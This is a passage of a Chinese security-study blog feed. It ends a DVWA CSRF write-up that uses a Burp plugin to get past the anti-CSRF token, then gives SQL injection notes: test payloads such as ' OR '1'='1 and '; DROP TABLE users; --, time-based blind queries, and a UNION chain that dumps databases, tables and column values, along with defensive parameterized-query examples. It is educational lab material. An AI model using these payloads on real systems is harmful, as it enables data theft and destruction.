function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>代码加入了<code>Anti-CSRF token</code>​机制，用户每次访问修改密码页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>所以在发起请求之前需要获取服务器返回的<code>user_token</code>​，利用<code>user_token</code>​绕过验证。这里使用burpsuit的<code>CSRF Token Tracker</code>​插件可以直接绕过user_token验证。</p><p>‍</p><p>进入插件之后添加主机和名（主机就是DVW服务器。名就是token的名字，这里是user_token），还有抓取到的token值也需要添加上去。</p><p><img src="/assets/image-20240409231926-a8zcnjf.png" alt="image">​</p><p>再重新抓包到重放模块，这时会发现不管怎么修改密码，都会返回200，CSRF Token Tracker插件里的token值也会自动更新（上图中的token值）。</p><p><img src="/assets/image-20240409231949-qi258lr.png" alt="image">​</p>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>CSRF漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入漏洞🕷️</title>
    <link href="/2024/03/26/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%F0%9F%95%B7%EF%B8%8F/"/>
    <url>/2024/03/26/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%F0%9F%95%B7%EF%B8%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>SQL注入是一种代码注入技术，也是最危险的Web应用程序漏洞之一。攻击者在用户输入字段中插入恶意代码，<strong>欺骗数据库执行SQL命令</strong>，从而窃取、篡改或破坏各类敏感数据。</p><p>‍</p><p>sqlmap工具使用<a href="https://www.cnblogs.com/bmjoker/p/9326258.html">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园 (cnblogs.com)</a></p><p>懒得看就看小迪第46天讲的很好‍</p><p>‍</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="MYSQL中常用函数"><a href="#MYSQL中常用函数" class="headerlink" title="MYSQL中常用函数"></a>MYSQL中常用函数</h2><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 查询数据库的版本<br>version()<br><br># 查询数据库的使用者<br><span class="hljs-keyword">user</span>()<br><br># 数据库名<br>database()<br><br># 系统用户名<br><span class="hljs-built_in">system_user</span>()<br><br># 连接数据库的用户名<br><span class="hljs-built_in">session_user</span>()<br><br># 当前用户名<br><span class="hljs-built_in">current_user</span>()<br><br># 读取本地文件<br>load_file()<br><br># 读取数据库路径<br>@<span class="hljs-variable">@datadir</span><br><br># mysql安装路径<br>@<span class="hljs-variable">@basedir</span><br><br># 查看操作系统<br>@<span class="hljs-variable">@version_complie_os</span><br></code></pre></td></tr></table></figure></blockquote><p>‍</p><h2 id="常见数据库端口"><a href="#常见数据库端口" class="headerlink" title="常见数据库端口"></a>常见数据库端口</h2><blockquote><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><p>1、MySql数据库 ，默认端口是: 3306<br>2、Oracle数据库 ，默认端口号为：1521<br>3、Sql Server数据库 ，默认端口号为：1433<br>4、DB2数据库， 默认端口号为：5000<br>5、PostgreSQL数据库， 默认端口号为：5432<br>6、国产的DM达梦数据库， 默认端口号为：5236</p><h3 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h3><p>1、Redis数据库，默认端口号：6379<br>2、Memcached数据库，默认端口号：11211<br>3、MongoDB数据库，默认端口号：27017</p><p>‍</p><p><a href="https://cloud.tencent.com/developer/article/1784274">非关系型数据库（NOSQL）和关系型数据库（SQL）区别详解-腾讯云开发者社区-腾讯云 </a></p></blockquote><p>‍</p><h2 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h2><p>隐式类型转换是指在数据处理过程中，系统自动将数据从一种类型转换为另一种类型的过程。在MySQL中，这通常发生在数据比较时，尤其是当一个字符串和一个数字进行比较时。MySQL会尝试将字符串转换为数字。</p><p>大致总结：从左往右进行转换，字符串从左到右第一个字符（包括本身）之后的全转换为零</p><p>举例：test1转换为0  1test转换为1</p><p><a href="https://blog.csdn.net/Yuppie001/article/details/138226546">【sql注入】mysql中隐式转换对于sql注入中的应用_隐式类型转换 注入-CSDN博客</a></p><p>‍</p><p>‍</p><h2 id="Mysql架构"><a href="#Mysql架构" class="headerlink" title="Mysql架构"></a>Mysql架构</h2><p><img src="/assets/image-20240720174148-y13q544.png" alt="image">​</p><p>‍</p><h3 id="增删改查方式"><a href="#增删改查方式" class="headerlink" title="增删改查方式"></a>增删改查方式</h3><ul><li><p>增加：INSERT INTO news (字段名) VALUES (数据)</p><p><img src="/assets/image-20240726192818-6nvqzte.png" alt="image">​</p></li><li><p>删除：DELETE FROM news WHERE id&#x3D;$id</p><p><img src="/assets/image-20240726192912-dqvc4kx.png" alt="image">​</p><p><img src="/assets/image-20240726192936-23ubsq8.png" alt="image">​</p></li><li><p>修改：UPDATE news SET id&#x3D;$id</p><p><img src="/assets/image-20240726193007-aa8ww03.png" alt="image">​</p></li><li><p>查询：SELECT * FROM news where id&#x3D;$id</p><p><img src="/assets/image-20240726195829-hx1kdt0.png" alt="image">​</p></li></ul><p>‍</p><p>‍</p><h2 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h2><p>‍</p><h3 id="影响条件："><a href="#影响条件：" class="headerlink" title="影响条件："></a><strong>影响条件：</strong></h3><ol><li><code>当前数据库ROOT用户权限</code>​，只有root用户才能进行跨库查询</li><li>数据库统一管理，必须符合MYSQL架构中的统一管理，每个网站的数据库都由root用户统一管理</li></ol><h3 id="注入流程（同常规查询）："><a href="#注入流程（同常规查询）：" class="headerlink" title="注入流程（同常规查询）："></a>注入流程（同常规查询）：</h3><ol><li><p>判断常见四个信息（系统，用户，数据库名，版本）</p><ul><li><p>数据库<strong>版本</strong>-看是否符合information_schema查询-version()，版本大于5.0就可以查询到数据库下的数据库名及表名，列名信息的数据库</p></li><li><p>数据库<strong>用户</strong>-看是否符合ROOT型注入攻击-user()</p></li><li><p>当前<strong>操作系统</strong>-看是否支持大小写或文件路径选择-@@version_compile_os，Linux对大小写敏感</p></li><li><p><strong>数据库名字</strong>-为后期猜解指定数据库下的表，列做准备-database()</p></li></ul></li><li><p>根据四个信息去选择方案</p></li><li><p>root用户：先测试读写，后测试获取数据（**&#x3D;&#x3D;首要目标：获取权限&#x3D;&#x3D;**）</p></li><li><p>非root用户：直接测试获取数据</p></li></ol><p>‍</p><p>‍</p><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>系统变量：<code>secure-file-priv</code>​</p><p><code>secure_file_priv</code>​ 是 MySQL 数据库中的一个系统变量，用于限制使用 <code>LOAD DATA INFILE</code>​ 和 <code>SELECT ... INTO OUTFILE</code>​ 语句时可以读取和写入的文件的路径。这个变量通常用于提高数据库的安全性，防止用户滥用这些语句导致的文件系统访问。</p><p>如果设置了这个变量，MySQL 将仅允许在指定的路径下进行文件的读取和写入操作，如果没有指定路径则可在全盘路径下进行文件的读取和写入<br>如果没有设置，MySQL 将默认使用空值，表示禁用 <code>LOAD DATA INFILE</code>​ 和 <code>SELECT ... INTO OUTFILE</code>​</p><h3 id="读写路径获取"><a href="#读写路径获取" class="headerlink" title="读写路径获取"></a>读写路径获取</h3><ol><li>报错显示获取路径</li><li>phpinfo页面泄露—<code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code>​</li><li>用常见的默认的中间件，数据库等安装路径读取有价值信息</li></ol><p><a href="https://blog.csdn.net/god_7z1/article/details/8725541">load_file()常用路径_loadfile(apppath 默认那个目录-CSDN博客</a></p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><p>‍</p><p><img src="/assets/image-20240728122221-uouaafx.png" alt="image">​</p><p>‍</p><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><h3 id="1-识别输入点"><a href="#1-识别输入点" class="headerlink" title="1. 识别输入点"></a>1. <strong>识别输入点</strong></h3><ul><li><strong>表单字段</strong>：如登录、搜索、注册表单等。</li><li><strong>URL参数</strong>：GET和POST请求中的参数。</li><li><strong>HTTP头</strong>：如Cookies、User-Agent等。</li><li><strong>其他输入源</strong>：如文件上传、API请求等。</li></ul><h3 id="2-基本测试"><a href="#2-基本测试" class="headerlink" title="2. 基本测试"></a>2. <strong>基本测试</strong></h3><ul><li><p>尝试输入单引号 (<code>&#39;</code>​)、双引号 (<code>&quot;</code>​)、分号 (<code>;</code>​)、反斜杠 (<code>\</code>​) 等字符，观察系统的响应是否出错或行为异常。</p></li><li><p>常见的输入：</p><ul><li><code>&#39; OR &#39;1&#39;=&#39;1</code>​</li><li><code>&quot; OR &quot;1&quot;=&quot;1</code>​</li><li><code>&#39;; DROP TABLE users; --</code>​</li><li><code>&#39; AND 1=1 --</code>​</li><li><code>&#39; UNION SELECT null, null, null --</code>​</li></ul></li></ul><h3 id="3-盲注测试"><a href="#3-盲注测试" class="headerlink" title="3. 盲注测试"></a>3. <strong>盲注测试</strong></h3><ul><li><p>使用布尔型盲注和时间盲注进行测试：</p><ul><li><p><strong>布尔型盲注</strong>：通过构造布尔表达式来判断结果是否为真。例如：</p><ul><li><code>1&#39; AND 1=1 --</code>​（返回正常页面）</li><li><code>1&#39; AND 1=2 --</code>​（返回不同页面）</li></ul></li><li><p><strong>时间盲注</strong>：通过构造导致延迟的SQL语句来判断是否存在注入。例如：</p><ul><li><code>1&#39; AND IF(1=1, SLEEP(5), 0) --</code>​（页面延迟加载）</li><li><code>1&#39; AND IF(1=2, SLEEP(5), 0) --</code>​（页面正常加载）</li></ul></li></ul></li></ul><h3 id="4-工具使用"><a href="#4-工具使用" class="headerlink" title="4. 工具使用"></a>4. <strong>工具使用</strong></h3><p>使用自动化工具进行SQL注入测试</p><h3 id="5-确认注入点"><a href="#5-确认注入点" class="headerlink" title="5. 确认注入点"></a>5. <strong>确认注入点</strong></h3><p>在确认SQL注入漏洞后，进一步测试其严重性，尝试读取数据库信息、提取数据、修改数据或执行其他恶意操作。</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>在进行SQL注入白盒审计时，关键函数和代码段通常是那些直接与数据库交互的部分。以下是一些需要特别注意的函数和代码模式：</p><h3 id="1-数据库查询函数"><a href="#1-数据库查询函数" class="headerlink" title="1. 数据库查询函数"></a>1. <strong>数据库查询函数</strong></h3><ul><li><strong>PHP:</strong>  <code>mysql_query()</code>​, <code>mysqli_query()</code>​, <code>PDO::query()</code>​, <code>PDO::prepare()</code>​</li><li><strong>Java:</strong>  <code>Statement.executeQuery()</code>​, <code>PreparedStatement.executeQuery()</code>​</li><li><strong>Python:</strong>  <code>execute()</code>​, <code>executemany()</code>​</li><li><strong>.NET:</strong>  <code>SqlCommand.ExecuteReader()</code>​, <code>SqlCommand.ExecuteNonQuery()</code>​</li></ul><h3 id="2-用户输入处理"><a href="#2-用户输入处理" class="headerlink" title="2. 用户输入处理"></a>2. <strong>用户输入处理</strong></h3><ul><li><strong>表单输入</strong>：需要特别注意用户可以提交数据的表单。</li><li><strong>URL参数</strong>：如GET和POST请求中的参数。</li><li><strong>Cookies</strong>：用户可以通过浏览器修改和提交的cookies数据。</li></ul><h3 id="3-动态生成SQL查询"><a href="#3-动态生成SQL查询" class="headerlink" title="3. 动态生成SQL查询"></a>3. <strong>动态生成SQL查询</strong></h3><ul><li><p>需要特别关注那些通过字符串拼接生成SQL查询的代码。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// PHP</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Java</span><br><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Python</span><br>query = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;%s&#x27;&quot;</span> % username<br></code></pre></td></tr></table></figure></li></ul><h3 id="4-输入验证和过滤"><a href="#4-输入验证和过滤" class="headerlink" title="4. 输入验证和过滤"></a>4. <strong>输入验证和过滤</strong></h3><ul><li><p>检查是否有输入验证和过滤的函数或代码块。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// PHP</span><br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Java</span><br>username = URLEncoder.encode(username, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Python</span><br>username = cgi.escape(username)<br></code></pre></td></tr></table></figure></li></ul><h3 id="5-ORM工具"><a href="#5-ORM工具" class="headerlink" title="5. ORM工具"></a>5. <strong>ORM工具</strong></h3><ul><li><p>尽管ORM工具可以减少SQL注入的风险，但也需要确保它们的使用方式是正确的。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用Django ORM的例子</span><br>User.objects.<span class="hljs-built_in">filter</span>(username=username)<br></code></pre></td></tr></table></figure></li></ul><h3 id="6-安全库和函数"><a href="#6-安全库和函数" class="headerlink" title="6. 安全库和函数"></a>6. <strong>安全库和函数</strong></h3><ul><li>使用安全的数据库库和函数，例如使用PDO的参数绑定而不是直接拼接SQL。</li></ul><p>具体例子：</p><ul><li><p><strong>PHP</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = :username&#x27;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]]);<br></code></pre></td></tr></table></figure></li><li><p><strong>Java</strong>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> connection.prepareStatement(query);<br>pstmt.setString(<span class="hljs-number">1</span>, username);<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> pstmt.executeQuery();<br></code></pre></td></tr></table></figure></li><li><p><strong>Python</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cursor.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = %s&quot;</span>, (username,))<br></code></pre></td></tr></table></figure></li></ul><p>在白盒审计中，重点是找到这些关键函数和代码，并检查是否存在未处理的用户输入或潜在的SQL注入风险。</p><p>‍</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><p>这里以MYSQL数据库为例介绍各注入类型，如遇其他数据库请自行查找相关信息</p><p>‍</p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><p>‍</p><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>‍</p><h4 id="关键字知识："><a href="#关键字知识：" class="headerlink" title="关键字知识："></a>关键字知识：</h4><ul><li><p>可使用<code>order by</code>​判断列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4# 报错</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span># 没有报错，说明存在<span class="hljs-number">3</span>列<br></code></pre></td></tr></table></figure></li><li><p>可使用<code>limit</code>​限制输出内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br>limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>跳过<span class="hljs-number">0</span>行选<span class="hljs-number">1</span>行的内容进行输出  <br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">3</span><br>limit <span class="hljs-number">1</span>,<span class="hljs-number">3</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>跳过<span class="hljs-number">1</span>行选<span class="hljs-number">3</span>行的内容进行输出<br></code></pre></td></tr></table></figure></li><li><p>可使用<code>between</code>​搭配<code>substr()</code>​函数精确判断字符内容（可用于盲注）</p><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p>sql语句：</p><p><code>select * from users where id =1 and substr(username,1,1) between &#39;a&#39; and &#39;b&#39;;</code>​</p><p><code>select * from users where id =1 and substr(username,1,1) between &#39;a&#39; and &#39;t&#39;;</code>​</p><p><img src="/assets/image-20240728172227-641gba3.png" alt="image">​</p></li></ul><p>‍</p><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> $id;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> age <span class="hljs-operator">=</span> $age;<br></code></pre></td></tr></table></figure><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>单双引号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$name&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> password <span class="hljs-operator">=</span> &quot;$passwd&quot;<br></code></pre></td></tr></table></figure><h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h4><p>%闭合</p><p>搜索型常伴随着字符型一起，所以还要注意单双引号的闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> password <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%$pwd%&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> password&quot;;<br></code></pre></td></tr></table></figure><p><strong>MYSQL模糊查询</strong></p><p>like 匹配&#x2F;模糊匹配，会与 <code>%</code>​ 和 <code>_</code>​ 结合使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;%a&#x27;</span>     <span class="hljs-operator">/</span><span class="hljs-operator">/</span>以a结尾的数据<br><span class="hljs-string">&#x27;a%&#x27;</span>     <span class="hljs-operator">/</span><span class="hljs-operator">/</span>以a开头的数据<br><span class="hljs-string">&#x27;%a%&#x27;</span>    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>含有a的数据<br><span class="hljs-string">&#x27;_a_&#x27;</span>    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>三位且中间字母是a的<br><span class="hljs-string">&#x27;_a&#x27;</span>     <span class="hljs-operator">/</span><span class="hljs-operator">/</span>两位且结尾字母是a的<br><span class="hljs-string">&#x27;a_&#x27;</span>     <span class="hljs-operator">/</span><span class="hljs-operator">/</span>两位且开头字母是a的<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p><img src="/assets/image-20240728135223-83l802t.png" alt="image">​</p><p>‍</p><h4 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h4><ul><li><h5 id="函数concat-​"><a href="#函数concat-​" class="headerlink" title="函数concat()​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>concat()</code>​</h5><p>语法：<code>concat(str1,str2,...)</code>​<br>拼接字符串，直接拼接，字符之间没有符号</p><p><img src="/assets/image-20240728155547-zoqf37o.png" alt="image">​</p></li></ul><ul><li><h5 id="函数concat-ws-​"><a href="#函数concat-ws-​" class="headerlink" title="函数concat_ws()​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>concat_ws()</code>​</h5><p>语法：<code>concat_ws(&#39;指定的符号&#39;,str1,str2,...)</code>​<br>指定符号进行拼接</p><p><img src="/assets/image-20240728155759-52jggp5.png" alt="image">​</p><p><img src="/assets/image-20240728155805-p6l8xjh.png" alt="image">​</p></li><li><h5 id="函数group-concat-​"><a href="#函数group-concat-​" class="headerlink" title="函数group_concat()​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>group_concat()</code>​</h5><p>语法：<code>group_concat(str1,str2,...)</code>​<br>将username中的内容以<strong>逗号</strong>隔开显示出来</p><p><img src="/assets/image-20240728155925-1qu3lxo.png" alt="image">​</p></li></ul><p>‍</p><h4 id="常规注入流程"><a href="#常规注入流程" class="headerlink" title="常规注入流程"></a>常规注入流程</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">爆出数据库：<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),3--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata#<br><br><br>爆出数据表：<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>数据库名<span class="hljs-string">&#x27;#</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">爆出字段：</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;数据表名&#x27;</span>#<br><br><br>爆出数据值：<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名--+</span><br><span class="hljs-string">                                    0x7e为~的16进制，这里是为了输出之后方便查看</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>‍</p><h4 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h4><p>‍</p><h5 id="常见函数-1"><a href="#常见函数-1" class="headerlink" title="常见函数"></a>常见函数</h5><ul><li><h6 id="函数length-​​"><a href="#函数length-​​" class="headerlink" title="函数length()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>length()</code>​​</h6><p>返回指定对象的长度<br>语法：<code>length(database())</code>​返回当前数据库名的长度</p><p><img src="/assets/image-20240728160302-zg8d3w1.png" alt="image">​</p></li><li><h6 id="函数left-​​-与函数right-​​"><a href="#函数left-​​-与函数right-​​" class="headerlink" title="函数left()​​ 与函数right()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>left()</code>​​ <span data-type="text" style="background-color: var(--b3-card-error-background); color: 